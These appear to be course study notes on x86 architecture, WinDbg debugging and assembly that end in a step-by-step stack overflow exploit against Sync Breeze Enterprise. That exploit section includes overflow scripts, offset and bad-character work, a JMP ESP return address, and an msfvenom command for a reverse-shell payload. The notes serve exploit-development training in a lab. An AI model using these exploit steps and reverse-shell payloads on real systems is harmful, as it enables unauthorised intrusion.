# WinDbg and x86 Architecture

```bash
xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /size:1900x880 /u:Offsec /p:lab /v:192.168.181.10 /drive:EXP-301,/home/kali/OffSec/EXP-301

rdesktop -a 16 -z -r sound:remote -x b -D -x m -g 1900x900 -u Offsec -p lab 192.168.167.10
```

## x86 Architecture

Process memory is allocated in Windows between the memory address 0x00000000 and 0x7FFFFFFF.

|            |       |
| ---------- | ----- |
| 0x00000000 |       |
|            | Stack |
| 0x00400000 | Program Image |
|            | Process Environment Block (PEB) |
|            | Thread Environment Block (TEB) |
|            | Heap |
|            |      |
|            | Dynamic Link Library (DLL) |
| 0x7FFDF000 |                            |
| 0x7FFFFFFF | Kernel Memory Space |
| 0xFFFFFFFF |                     |

When a thread is running, it executes code from within the **Program Image** or from various **DLLs**.

Each thread in a running application has its own **stack** which is a short-term data area for functions, local variables, and program control information.

Last-In, First-Out: While accessing the stack, items put ("pushed") on the top of the stack are removed ("popped") first.

The x86 architecture implements dedicated **PUSH** and **POP** assembly instructions to add or remove data to the stack respectively.

Multiple **calling conventions** (The Windows x86 API makes use of the **__stdcall** calling convention)

- How the parameters and return value are passed (placed in CPU registers, pushed on the stack, or both), in which order they are passed

- How the stack is prepared and cleaned up before and after the call, and what CPU registers the called function must preserve for the caller.

When a function ends, the **return address** is taken from the stack and used to restore the execution flow to the calling function.

The "return address" (+ function's parameters and local variables) is associated with one function call and is stored in a **stack frame**.

| Thread Stack Frame Example |
| -------------------------- |
| Function A return address:    0x00401024 |
| Parameter 1 for function A:   0x00000040 |
| Parameter 2 for function A:   0x00001000 |
| Parameter 3 for function A:   0xFFFFFFFF |

| 32-bit register | Lower 16 bits | Higher 8 bits | Lower 8 bits |
| --------------- | ------------- | ------------- | ------------ |
| EAX             | AX            | AH            | AL           |
| EBX             | BX            | BH            | AL           |
| ECX             | CX            | CH            | AL           |
| EDX             | DX            | DH            | AL           |
| ESI             | SI            | N/A           | N/A          |
| EDI             | DI            | N/A           | N/A          |
| EBP             | BP            | N/A           | N/A          |
| ESP             | SP            | N/A           | N/A          |
| EIP             | IP            | N/A           | N/A          |

General purpose registers:
- EAX (accumulator): Arithmetical and logical instructions
- EBX (base): Base pointer for memory addresses
- ECX (counter): Loop, shift, and rotation counter
- EDX (data): I/O port addressing, multiplication, and division
- ESI (source index): Pointer addressing of data and source in string copy operations
- EDI (destination index): Pointer addressing of data and destination in string copy operations

The stack is **dynamic** and changes constantly during program execution.

The stack pointer **ESP** keeps "track" of the most recently referenced location on the stack (top of the stack) by storing a pointer to it.

A pointer is a reference to an address (or location) in memory.

A register "stores a pointer" or "points" to an address:
=> The register is storing that target address

For a function to locate its stack frame, which stores the required arguments, local variables, and the return address.

=> The base pointer **EBP** stores a pointer to the top of the stack when a function is called. By accessing EBP, a function can easily reference information from its stack frame (via **offsets**) while executing.

EIP, the instruction pointer, always points to the next code instruction to be executed.

## WinDbg

`Attach to a Process...` (F6 key)

The debugger injects a software breakpoint by overwriting the current instruction in memory with an `INT 3` assembly instruction.

Note: If we do not enter a 'g' (Go) at the command window prompt, the application will stay suspended.

**Disassembly** view shows the next instructions to be executed by the CPU.

**Command** window will allow us to interact with WinDbg and use more advanced features such as the built-in scripting language.

Customized WinDbg to roughly mimic the layout of the **Immunity Debugger**

| Left        | Right     |
| ----------- | --------- |
| Disassembly | Registers |
| Memory      | Memory    |
| Command     |           |

End the current debugging session in 2 ways:

1. Selecting `Debug > Detach Debugee`, which leaves the application running.

2. Selecting `Debug > Stop Debugging` or with the `Shift + F5` keyboard shortcut, which closes the application.

The command `.hh` , and refer to the cheat sheet `http://windbg.info/doc/1-common-cmds.html` for a quick review.

### Debugging Symbols

**Symbol files** permit WinDbg to reference internal functions, structures, and global variables using names instead of addresses.

Configuring the symbols path allows WinDbg to fetch symbol files for **native Windows executables and libraries** from the official Microsoft symbol store.

The symbols files (with extension `.PDB`) are created when the native Windows files are compiled by Microsoft.

`https://msdl.microsoft.com/download/symbols`

Microsoft does not provide symbol files for all library files, and 3rd party applications may have their own symbol files.

Set up the debugging environment:
- Access the symbol settings through the `File > Symbol File Path...` menu. A commonly used symbol path is `C:\symbols`.

Force the download of available symbols for all loaded modules before debugging

```
.reload /f
```

Inspect the assembly code of certain Windows APIs + any part of the code of the current running program.

The `u` command accepts either a single **memory address** or a **range of memory** as an argument, i.e. where to start disassembling from.

If we do not specify this argument, the disassembly will begin at the memory address stored in **EIP**.

Select `Break` from the `Debug` menu to halt execution.

Provide a **function symbol** or a memory address

```
u kernel32!GetCurrentThread
u myapp!main L3
u 00a01020
u @eip
```

`ub` command is a variation on the unassemble command that disassembles instructions prior to the supplied address.

```
ub 00c0299b L1
```

### Reading from Memory

| Size indicator        | Example               |   
| --------------------- | --------------------- |
| byte                  | db kernel32!WriteFile |
| words (two bytes)     | dw @esp               |
| DWORDs (four bytes)   | dd @esp               |
| QWORDs (eight bytes)  | dq 00faf974           |


Display ASCII characters in memory + WORDs or DWORDs

```
dW KERNELBASE+0x40
dc KERNELBASE
```

The default length when displaying data is **0x80** bytes.

- `dW L2` command outputs 2 WORDS
- `db L2` outputs 2 bytes.

```
db memory!ugreeting L1a
dW KERNELBASE L2
dd @esp L10
```

Display the memory content at a specified address as

- ASCII format using the `da` command
- Unicode format using the `du` command.

```
da @esp
da memory!greeting
da 00b4c0a8
du @edi
```

Display data referenced from a memory address. (same as using `dd`  twice to emulate a memory dereference)

```
dd poi(esp)
da poi(memory!ptr)
```

```
dd @esp L1
dd 771bab89
```

### Dumping Structures from Memory

The `dt` command takes the **name of the structure** to display as an argument and, optionally, a **memory address** from which to dump the structure data.

Each specified field for that structure is shown at the relative specific **offset** into the structure, field name and its data type**.

For cases where a field points to a **nested structure**, the field data type is replaced by the correct **sub-structure type**.

- The sub-structure type can also be identified with an **underscore** (_) leading the field type

- The field type name in **capital letters**.

The structure needs to be provided by one of the loaded **symbol files**.

Supply the `-r` flag to the `dt` command to recursively **display nested structures** where present.

The **$teb** pseudo register == address of the Thread Environment Block (TEB)

Display specific fields in the structure by passing the **name of the field** as an additional parameter.

```
dt memory!_HACKER
dt -r memory!_HACKER
dt -r1 memory!_HACKER
dt memory!_HACKER handle
dt memory!_HACKER handle id
dt memory!_HACKER biography.age
dt memory!_HACKER 00b4de40
dt -r memory!_HACKER 00b4de40 biography.profile.favfood

dt ntdll!_TEB
dt -r ntdll!_TEB @$teb
dt ntdll!_TEB @$teb ThreadLocalStoragePointer
```

Display the **size of a structure** extracted from a symbol file

```
?? sizeof(ntdll!_TEB)
```

### Writing to Memory

```
ed esp 41414141
eb memory!integer 41 42 43 44
```

`ea` and `eu` do not null terminate strings.

=> `eza` and `ezu` commands for ASCII and Unicode strings, respectively

```
ea esp "Hello"
ea memory!greeting "Goodbye!"
eu memory!ugreeting "Farewell!"

eza memory!greeting "Goodbye!"
```

### Searching the Memory Space

4 additional parameters to perform a search:

1. The memory type to search for (`-d` for DWORD)
2. The starting point of memory to search (0)
3. The length of memory to search (to search the whole memory range, enter "L?80000000")
4. The pattern to search for (41414141)

```
s -b 0 L?80000000 48 65 6c 6c 6f
s -d 0 L?80000000 41414141
s -a 0 L?80000000 "This program cannot be run in DOS mode"
s -a 0xb80000 L1000 "I'm an egg"
s -u 0 L?80000000 w00tw00t
```

### Inspecting and Editing CPU Registers in WinDbg

```
r

r ecx
r zf

r ecx=41414141
r zf = 0
```

### Controlling the Program Execution in WinDbg

2 different types of breakpoints; software and processor/hardware breakpoints.

#### Software Breakpoints

Use the `bl` command to list all the breakpoints.

Let the execution continue by issuing the `g` command.

Disable and enable breakpoints using the `bd` (disable) and `be` (enable) commands.

Clear breakpoints using the `bc` command

```
bl
bd 0
be 0
bc 0
bc *
```

Set a breakpoint that will halt the execution flow of the application when changes are being saved to a file.

```
bp kernel32!WriteFile
bp flow!breakme
bp 00c01020
g
```

Use the `bu` command to set a breakpoint on an unresolved function. This is a function residing in a module that isn't yet loaded in the process memory space.

The breakpoint will be enabled when the module is loaded and the target function is resolved.

```
lm m ole32
bu ole32!WriteStringStream
g
```

While the breakpoint is resolved when `ole32.dll` is loaded, it is not triggered. Because our actions did not force a call to ole32!WriteStringStream

Execute the `.printf` command every time the breakpoint set on the kernel32!WriteFile API is triggered - Display the number of bytes to write to the target file (3rd argument)

```
bp kernel32!WriteFile ".printf \"The number of bytes written is: %p\", poi(esp + 0x0C);.echo;g"

bp flow!doubl ".printf \"The value of the argument: %x\", poi(esp+4); .echo"

bp flow!doubl ".printf \"The contents of the global variable: %ma\", flow!data; .echo"

bp flow!doubl ".if (poi(esp+4) > 0x20) {.printf \"The value of the argument: %x\", poi(esp+4); .echo} .else {gc}"
```

`.printf` supports the use of format strings such as `%p`, which will display the given value as a pointer.

The `.echo` command displays the output of .printf to the WinDbg command window.

The WriteFile prototype:

```c
BOOL WriteFile(
  HANDLE       hFile,
  LPCVOID      lpBuffer,
  DWORD        nNumberOfBytesToWrite,
  LPDWORD      lpNumberOfBytesWritten,
  LPOVERLAPPED lpOverlapped
);
```

Windows x86 API: Function arguments are pushed on the stack in reverse order (right to left). In this case, each argument occupies **4 bytes** of memory on the stack.

Halt the execution flow only if we write exactly 4 bytes of data to a file from Notepad

```
bp /w "@eax == 5" 00c010e7

bp kernel32!WriteFile ".if (poi(esp + 0x0C) != 4) {gc} .else {.printf \"The number of bytes written is 4\";.echo;}"
```

When our breakpoint on WriteFile is triggered, use `gc` (go from conditional breakpoint) to resume execution, unless the nNumberOfBytesToWrite argument (3rd argument on the stack) is equal to "4".

#### Hardware Breakpoints

Hardware or processor breakpoints are handled by the processor and stored in the processor's debug registers.

They can stop code execution when a particular type of access, such as read, write, or execute, is made to a targeted memory location.

=> Provide the ability to monitor changes or access to data in memory.

However, the x86 and x64 architectures only use 4 debug registers, so unlike software breakpoints, we are **limited by the number of processor breakpoints**.

Hardware breakpoints must be set after the entry point has been reached and a simple way of doing this is by attaching to a running process.

3 arguments to the `ba` command.
1. The type of access, which can be either e (execute), r (read), or w (write).
2. The size in bytes for the specified memory access
3. The memory address where we want to set the breakpoint at.

```
ba e 1 kernel32!WriteFile
ba r 1 flow!data
ba w 2 03b2c768
g
```

### Stepping Through the Code

The `p` command will execute one single instruction at a time and steps over function calls, and `t` will do the same, but will also step into function calls.

`pt` (step to next return) allows us to fast-forward to the end of a function.

`ph` executes code until a branching instruction is reached. This includes conditional or unconditional branches, function calls, and return instructions.

```
p
p 2
t

pt
tt

ph
th
```

`pa` allow us to execute until a specific instance of a particular command + gives us a step-by-step account of the state of execution.

```
pa 00d0105d
```

### Listing Modules and Symbols in WinDbg

Display all loaded modules, including their starting and ending addresses in virtual memory space:

The `lm` command can also filter modules by accepting the wildcard (*) character:

```
lm
lm m kernel*
```

Dump symbols present from the KERNELBASE module.

```
x kernelbase!CreateProc*
x *!strcpy
x features!???cpy
```

### Using WinDbg as a Calculator

Find the difference between 2 addresses or finding lower or upper byte values of a DWORD

```
? @eip + 24
? 77269bc0  - 77231430
? 77269bc0 >> 18
? 0x12345678 & 0xffff
```

```
? features!buf1 - features!buf2
```

Convert the hex number 41414141 to decimal, then convert the decimal number 0n41414141 to hexadecimal, and finally convert the binary 0y1110100110111 to decimal and hexadecimal.

```
? 41414141
? 0x20
? 0n41414141
? - 0n254
? 0y1110100110111
```

The `.formats` command is also useful for converting between different formats at once, including the ASCII representation of the value

```
.formats 41414141
.formats @esp
.formats 0x12345678 & 0xffff
```

### Pseudo Registers

20 user-defined pseudo registers named $t0 to $t19 can be used as variables during mathematical calculations.

**When using pseudo registers as well as regular registers, it is recommended to prefix them with the "@" character.**

It speeds up the evaluation process because WinDbg will not try to resolve it as a symbol first.

```
? ((41414141 - 414141) * 0n10) >> 8
```

Performed with a pseudo register

```
r @$t0 = (41414141 - 414141) * 0n10
? @$t0 >> 8
```

### WinDbg Extensions

Use `!address` to find out more about the address in the eip register.

The address in eip belongs to the image, which contains the binary instructions, something that is indicated by the "Usage: Image" field.

Other useful information includes the base address and end address of the memory region and its size. + information related to its type, protections, and state.

Contrast this with a stack address:

In this Listing, the same fields are provided, but the address, unsurprisingly, belongs to a different memory region and as a result the fields have different values. Note, in particular, that protections have changed. Although the image is executable, the stack, in this case, is not.

- The `!address` extension command provides information about the **memory range** within which an address falls, which includes it's protections,

- The `!vprot` command provides information about the **specific address**. This is significant because the protections of the page to which the address belongs may have been altered at some point after the memory is allocated.

The `!teb` and `!peb` commands provide us with information about the contents of the TEB (Thread Environment Block) and PEB (Process Environment Block) structures, respectively.

```
!address @eip
!address @esp

!vprot @esp
```

### WinDbg Scripting

`$><C:\windbg_lu\lu5\script.wds`

```nasm
bp features!func
r $t0 = 0
.for (r $t1 = 0; @$t1 < a; r $t1 = @$t1 + 1) 
{
    g
    r $t0 = @$t0 + poi(@esp + 4)
    .printf "Argument: 0x%x (%c)\n", poi(@esp + 4), poi(@esp + 4)
}
.printf "Sum of arguments: 0x%x", @$t0
```

Shorter version using breakpoint-based actions

```nasm
r $t0 = 0
r $t1 = 0
bp features!func "r $t0 = @$t0 + poi(@esp + 4); .printf \"Argument: 0x%x (%c)\\n\", poi(@esp + 4), poi(@esp + 4); r $t1 = @$t1 + 1; .if (@$t1 == 0xa) {.printf \"Sum of arguments: 0x%x\", @$t0}; g"
g
```

# x86-64 (Intel) Assembly

Instructions for **unsigned** number comparisons

| Instruction |          Name                              |
|-------------|--------------------------------------------|
| JE/JZ       | Jump if Equal or Jump if Zero              |
| JNE/JNZ     | Jump if not Equal / Jump if Not Zero       |
| JA/JNBE     | Jump if Above / Jump if Not Below or Equal |
| JAE/JNB     | Jump if Above or Equal / Jump if Not Below |
| JB/JNAE     | Jump if Below / Jump if Not Above or Equal |
| JBE/JNA     | Jump if Below or Equal / Jump if Not Above |

Instructions for **signed** number comparisons

| Instruction |          Name                               |
|-------------|---------------------------------------------|
| JE/JZ       | Jump if Equal or Jump if Zero               |
| JNE/JNZ     | Jump if not Equal / Jump if Not Zero        |
| JG/JNLE     | Jump if Greater / Jump if Not Less or Equal |
| JGE/JNL     | Jump if Greater / Equal or Jump Not Less    |
| JL/JNGE     | Jump if Less / Jump if Not Greater or Equal |
| JLE/JNG     | Jump if Less or Equal / Jump Not Greater    |

## While loop

```c
i = 3;
j = 10;
while (i <> 0)
{
  j++;
  i--;
}
```

```nasm
init_loop:
  MOV ECX, 3
  MOV EAX, 10

loop:
  TEST ECX, ECX
  JZ continue_here
  INC EAX
  DEC ECX
  JMP loop
  
continue_here:
...
```

## If-Else

```c
i = 3;
if (i > 4):
  i = i + 5;
else if (i < 3):
  i = i + 6;
else if (i == 3):
  i++;
i = 4;
```

```nasm
init:
  MOV EAX, 3

branching:
  CMP EAX, 4
  JA add_5
  CMP EAX, 3
  JB add_6
  JE add_1
  JMP end
  
add_5:
  ADD EAX, 5
  JMP end
add_6:
  ADD EAX, 6
  JMP end
add_1:
  INC EAX
  JMP end
  
end:
  MOV EAX, 4
```

```bash
nasm -f elf32 test.asm
ld -m elf_i386 test.o -o test
./test
```

## Hello World in 64-bit Assembly

`hello.asm`

```nasm
global _start

section .text

_start:
  ; write system call
  MOV RDI, 1                ; standard output
  MOV RSI, hello_text       ; address of "Hello world!"
  MOV RDX, hello_text_len   ; length of "Hello world!"
  MOV RAX, 1                ; write syscall number
  SYSCALL

  ; exit system call
  MOV RDI, 0                ; success
  MOV RAX, 60               ; exit syscall number
  SYSCALL

section .data
  hello_text db "Hello world!", 0
  hello_text_len equ $ - hello_text
```

```bash
nasm -f elf64 hello.asm
ld hello.o -o hello
./hello
```

## Gdb commands

```bash
gdb test
```

Set the debugger to use the Intel assembly syntax instead of AT&T, which is the default

Disassemble the code with the /r option to also show the **opcodes**

```
break _start
break *0x00401015

delete 2

run
stepi
c

set disassembly-flavor intel

disassemble
disassemble /r
disassemble 0x8049000

info registers
info registers eip

x/4b 0x08049000
x/64xw $esp
x/s 0x402000
```

# Exploiting Stack Overflows

Data Execution Prevention (DEP):
- is a set of hardware and software technologies that perform additional memory checks to help prevent malicious code from running on a system.
- helps prevent code execution from data pages by raising an exception when attempts are made to do so.

Address Space Layout Randomization (ASLR) randomizes the base addresses of loaded applications and DLLs every time the OS is booted.

On older Windows OS, like Windows XP where ASLR is not implemented, all DLLs are loaded at the same memory address every time, which makes exploitation easier.

When coupled with DEP, ASLR provides a very strong mitigation against exploitation.

Control Flow Guard (CFG) is Microsoft's implementation of control-flow integrity: performs validation of **indirect code branching** such as a **call instruction that uses a register** as an operand **rather than a memory address** such as CALL EAX.

=> Prevent the overwrite of function pointers in exploits.

```c
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[])
{
	char buffer[64];

	if (argc < 2)
	{
		printf("Error - You must supply at least one argument\n");
		return 1;
	}
	
	strcpy(buffer, argv[1]);
	
  return 0;
}
```

| Before StrCpy | Copy with 32 A's | Copy with 80 A's |
| ------------- | ---------------- | ---------------- |
| StrCpy destination address | StrCpy destination address | StrCpy destination address |
| StrCpy source address | StrCpy source address | StrCpy source address |
| Reserved char buffer memory | AAAAAAAAAAAAAAAA | AAAAAAAAAAAAAAAA |
| Reserved char buffer memory | AAAAAAAAAAAAAAAA | AAAAAAAAAAAAAAAA |
| Reserved char buffer memory | Reserved char buffer memory | AAAAAAAAAAAAAAAA |
| Reserved char buffer memory | Reserved char buffer memory | AAAAAAAAAAAAAAAA |
| Return address of main | Return address of main | AAAA |
| Main parameter 1 | Main parameter 1 | AAAA |
| Main parameter 2 | Main parameter 2 | AAAA |

The CPU will try to read the next instruction from 0x41414141 (0x41 hexadecimal value of "A").

Since this is not a valid address in the process memory space, the CPU will trigger an access violation, crashing the application.

## Controlling EIP

`python stack_overflow_0x01.py 192.168.120.10`

```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  inputBuffer = b"A" * size
  content = b"username=" + inputBuffer + b"&password=A"

  buffer = b"POST /login HTTP/1.1\r\n"
  buffer += b"Host: " + server.encode() + b"\r\n"
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
  buffer += b"Referer: http://10.11.0.22/login\r\n"
  buffer += b"Connection: close\r\n"
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
  buffer += b"\r\n"
  buffer += content

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()
 
  print("Done!")

except socket.error:
  print("Could not connect!")
```

The EIP register is overwritten by 4 `0x41` bytes, which are part of our `username` string, the 800-byte "A" buffer.

Which part of our buffer is landing in EIP?

1. Attempt a binary tree analysis: Instead of 800 A's, send 400 A's and 400 B's. If EIP is overwritten by B's => The 4 bytes are in the 2nd half of the buffer. Then change the 400 B's to 200 B's and 200 C's, and send the buffer again. Continue splitting the specific buffer until we reach the exact 4 bytes that overwrite EIP.

2. Insert a long string made of non-repeating 4-byte chunks as our input > when the EIP is overwritten with 4 bytes from our string, use that unique sequence to pinpoint the exact location. 

Generate a non-repeating string

```bash
locate pattern_create
msf-pattern_create -h

msf-pattern_create -l 800
```

```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  #inputBuffer = b"A" * size
  inputBuffer = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba"
  content = b"username=" + inputBuffer + b"&password=A"
...
```

The EIP register has been overwritten with `42306142` (hexadecimal value of "B0aB"). 

```bash
msf-pattern_offset -l 800 -q 42306142
```

*[*] Exact match at offset 780*

```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  filler = b"A" * 780
  eip = b"B" * 4
  buf = b"C" * 16
  inputBuffer = filler + eip + buf
  content = b"username=" + inputBuffer + b"&password=A"
...
```

The EIP now contains our 4 B's (`0x42424242`)

## Locating Space for Our Shellcode

```
r
dds esp L3
dds esp -10 L8
```

The first 4 C's from our buffer landed at address `0x00567458`.

The current **ESP** value is `0x0056745c`, which points to the next 4 C's from our buffer.

A standard reverse shell payload requires ~350-400 bytes of space.

=> Try increasing the buffer length from 800 bytes to 1500 bytes.

In some cases, increasing the length of a buffer may result in a completely different crash since the larger buffer **overwrites additional data on the stack** that is used by the target application.

```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  
  filler = b"A" * 780
  eip = b"B" * 4
  offset = b"C" * 4
  shellcode = b"D" * (1500 - len(filler) - len(eip) - len(offset))
  inputBuffer = filler + eip + offset + shellcode
  content = b"username=" + inputBuffer + b"&password=A"
...
```

```
dds esp - 8 L7
dds esp+2c0 L4
```

```
? 00567724 - 0056745c
```

*Evaluate expression: 712 = 000002c48*

=> 712 bytes of free space for our shellcode.

## Checking for Bad Characters

Depending on the application, vulnerability type, and protocols in use, there may be certain bad characters that should not be used in our **buffer, return address, or shellcode**.

A bad character prevents or changes the nature of our crash. Or  they end up mangled in memory.

E.g., The null byte (`0x00`) is used to terminate a string in low-level languages such as C/C++. This causes the string copy operation to end, effectively truncating our buffer at the first instance of a null byte. 

Because we are sending the exploit as part of an HTTP POST request, avoid the return character `0x0D`, which signifies the end of an HTTP field (the `username` in this case).

**Send all possible characters** - from `0x00` to `0xFF` - as part of our buffer

```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  
  filler = b"A" * 780
  eip = b"B" * 4
  offset = b"C" * 4
  badchars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
    b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
    b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
    b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
    b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
    b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
    b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
    b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
    b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
    b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
    b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
    b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
    b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
    b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
    b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
  inputBuffer = filler + eip + offset + badchars
  content = b"username=" + inputBuffer + b"&password=A"
...
```

```
db esp - 10 L20
```

`0x0A` character translates to a **line feed**, which terminates an HTTP field, similar to a **carriage return**.

Repeat these steps until we have verified every character.

=> `0x00, 0x0A, 0x0D, 0x25, 0x26, 0x2B, and 0x3D` will mangle our input buffer while attempting to overflow the destination buffer.

## Finding a Return Address

Leverage a `JMP ESP` instruction => Find a reliable static address that contains this instruction

Redirect EIP to this address, the JMP ESP instruction will be executed and direct the execution flow into our shellcode.

Many support libraries in Windows contain this commonly-used instruction, but 2 important criteria:

1. The address used in the library must be static, which eliminates the libraries compiled with **ASLR** support.

2. The address of the instruction must not contain any of the **bad characters** that would break the exploit, since the address will be part of our input buffer.

To determine the protections of a particular module, check the `DllCharacteristics` member of the `IMAGE_OPTIONAL_HEADER` structure, which is part of the `IMAGE_NT_HEADERS` structure.

The `IMAGE_NT_HEADERS` structure can be found in the **PE header** of the target module.

The Portable Executable (PE) format starts with the **MS DOS header**, which contains an offset to the start of the **PE header** at offset `0x3C`.

Find the protections of the `syncbrs.exe` executable

Get the base address of the module

```
lm m syncbrs
```

Dump the `IMAGE_DOS_HEADER5`

```
dt ntdll!_IMAGE_DOS_HEADER 0x00400000 
```

At offset `0x3C`, the `e_lfanew` field contains the offset to our PE header (`0xE8`) from the base address of `syncbrs.exe`

```
? 0n232
```

*Evaluate expression: 232 = 000000e8*

```
dt ntdll!_IMAGE_NT_HEADERS 0x00400000+0xe8
```

At offset `0x18` we have the IMAGE_OPTIONAL_HEADER structure we need that contains the DllCharacteristics field.

```
dt ntdll!_IMAGE_OPTIONAL_HEADER 0x00400000+0xe8+0x18
```

The current value of `DllCharacteristics` is `0x00` => `syncbrs.exe` does not have any protections enabled such as **SafeSEH** (Structured Exception Handler Overwrite), an exploit-preventative memory protection technique, **ASLR**, or **NXCompat** (DEP protection).

The `ImageBase` member being set to `0x400000` => the preferred load address for `syncbrs.exe` is `0x00400000`. 

=> All instructions' addresses (`0x004XXXXX`) will contain at least one null character => unsuitable for our input buffer.

**Process Hacker** tool detects mitigations, such as DEP and ASLR, + more modern mitigations such as ACG and CFG.

Launch Process Hacker > Double click the `syncbrs.exe` executable >  Under the **General** tab, find the **Mitigation Policies** field, which is currently set to "None" > Clicking on **Details** also shows no mitigations in place.

Browsing to the **Module** tab provides us with all the **DLLs** that are loaded in the process memory > To inspect the `DllCharacteristics`, double click on a module and open the properties window.

Searching through all the modules, we discover that `LIBSSP.DLL` suits our needs and the **address range** doesn't seem to contain bad characters.

**Advanced tip**: If this application was compiled with **DEP** support, our `JMP ESP` address would need to be located in the `.text` code segment of the module. This is the only segment with both read (R) and executable (E) permissions.

Since DEP is not enabled in this case, we can use instructions from any address in this module.

```bash
msf-nasm_shell
nasm > jmp esp
```

*00000000  FFE4              jmp esp*

```nasm
lm m libspp
```

*10000000 10223000   libspp   C (export symbols)       C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll*

```nasm
s -b 10000000 10223000 0xff 0xe4
```

the output reveals one address containing a JMP ESP instruction (`0x10090c83`), which fortunately does not contain any of our bad characters.

```nasm
u 10090c83
```

```python
#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  
  filler = b"A" * 780
  eip = b"\x83\x0c\x09\x10" # 0x10090c83 - JMP ESP
  offset = b"C" * 4
  shellcode = "D" * (1500 - len(filler) - len(eip) - len(offset))
  inputBuffer = filler + eip + offset + shellcode
  content = b"username=" + inputBuffer + b"&password=A"
...
```

The `JMP ESP` address is written in reverse order; Little endian is currently the most widely-used format and is used by the x86 and AMD64 architectures.

In the little endian format, the low-order byte of the number is stored in memory at the lowest address, and the high-order byte at the highest address. Therefore, we have to store the return address in reverse order in our buffer for the CPU to interpret it correctly in memory.

```
bp 10090c83
g
t
dc eip 4
```

## Generating Shellcode with Metasploit

```bash
msfvenom -l payloads

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

Replace regex `"\n"` with blank in VS Code

## Getting a Shell

Because of the encoding, the shellcode is prepended by a decoder stub.

